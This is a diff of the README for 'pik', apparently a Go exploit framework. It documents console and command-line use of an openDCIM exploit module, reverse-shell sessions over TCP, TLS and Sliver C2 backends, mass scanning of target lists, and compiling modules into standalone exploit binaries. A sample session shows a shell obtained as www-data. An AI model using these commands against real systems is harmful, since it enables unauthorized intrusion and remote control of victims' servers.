@@ -8,41 +8,50 @@ Go exploit framework. Write exploits once, run them as standalone binaries or in
 go install github.com/Chocapikk/pik/cmd/pik@latest
 ```
 
+Or self-update an existing install:
+
+```bash
+pik update
+```
+
 ## Usage
 
 ```bash
-pik console                        # Interactive console
-pik run opendcim -t target -s LHOST=ip  # Run an exploit
-pik check opendcim -t target       # Check only
-pik info opendcim                  # Module details + dorks
-pik build opendcim -o opendcim     # Standalone binary
+pik console                              # Interactive console
+pik run opendcim -t target -s LHOST=ip   # Run an exploit
+pik check opendcim -t target             # Check only
+pik info opendcim                        # Module details + dorks
+pik build opendcim -o opendcim           # Standalone binary
+pik list                                 # List all modules
 ```
 
 ## Console
 
 ```
 pik > use opendcim
-pik opendcim > set TARGET http://target
-pik opendcim > set LHOST 10.0.0.1
-pik opendcim > show targets
-  * 0  Unix/Linux Command Shell   cmd
-    1  Linux Dropper              dropper  amd64, arm64, 386
-pik opendcim > exploit
-[+] Session 1 opened (10.0.0.2:49326)
+pik exploit/http/linux/opendcim > show options
+pik exploit/http/linux/opendcim > set TARGET http://target
+pik exploit/http/linux/opendcim > set RPORT 8080
+pik exploit/http/linux/opendcim > set LHOST 10.0.0.1
+pik exploit/http/linux/opendcim > check
+pik exploit/http/linux/opendcim > exploit
+>> Session 1 opened (10.0.0.2:49326)
 www-data@target:~$ ^Z
-[*] Session 1 backgrounded
-pik opendcim > sessions
-pik opendcim > kill 1
+>> Session 1 backgrounded
+pik exploit/http/linux/opendcim > sessions
+pik exploit/http/linux/opendcim > kill 1
 ```
 
-Ctrl+Z backgrounds a session. `resource exploit.rc` runs commands from a file.
+Commands: `use`, `back`, `show options|advanced|payloads|targets|modules`, `set`, `unset`, `target`, `check`, `exploit`, `sessions`, `kill`, `search`, `info`, `resource`, `list`, `rank`, `help`.
+
+Ctrl+Z backgrounds a session. `resource exploit.rc` runs commands from a file. History persists across sessions.
 
 ## C2 backends
 
 Three built-in backends, plus Sliver integration:
 
 ```bash
-# TCP (default)
+# TCP reverse shell (default)
 pik run opendcim -t target -s LHOST=ip
 
 # TLS encrypted
@@ -59,9 +68,24 @@ pik run opendcim -t target -s LHOST=ip -s C2=sliver -s C2CONFIG=~/.sliver/config
 
 ```bash
 pik check opendcim -f targets.txt -t 50 -o vulnerable.txt
+pik check opendcim -f targets.txt -t 50 -o results.json --json
 ```
 
 Supports HTTP/SOCKS5 proxy with `-s PROXIES=socks5://127.0.0.1:1080`.
+
+## Standalone binaries
+
+Any module can be compiled into a self-contained binary (~6 MB) with check, exploit, scanner, and reverse shell listener built in:
+
+```bash
+pik build opendcim -o opendcim
+./opendcim --help
+./opendcim -t target -s LHOST=10.0.0.1                      # Exploit
+./opendcim -t target --check                                 # Check only
+./opendcim -f targets.txt --threads 50 -o vulns.txt --check  # Mass scan
+```
+
+All module options are passed via `-s KEY=VALUE`. Run `--help` to see available options.
 
 ## Write your own exploit
 
@@ -111,10 +135,24 @@ func main() {
 ```
 
 ```bash
-go build -o myexploit . && ./myexploit -t http://target --lhost 10.0.0.1
+go build -o myexploit .
+./myexploit -t http://target -s LHOST=10.0.0.1
 ```
 
-The standalone binary includes check, exploit, reverse shell listener, and all CLI flags in ~6 MB.
+## Supply chain security
+
+Release binaries are signed with minisign. `pik update` verifies the signature and checksum before replacing itself. The signing public key is embedded in the binary.
+
+## Build from source
+
+```bash
+make build                   # Dev build
+make build VERSION=1.0.0     # Versioned build
+make static                  # Static binary (CGO_ENABLED=0)
+make install                 # Install to $GOPATH/bin
+make test                    # Run tests
+make vet                     # Lint
+```
 
 ## License
 
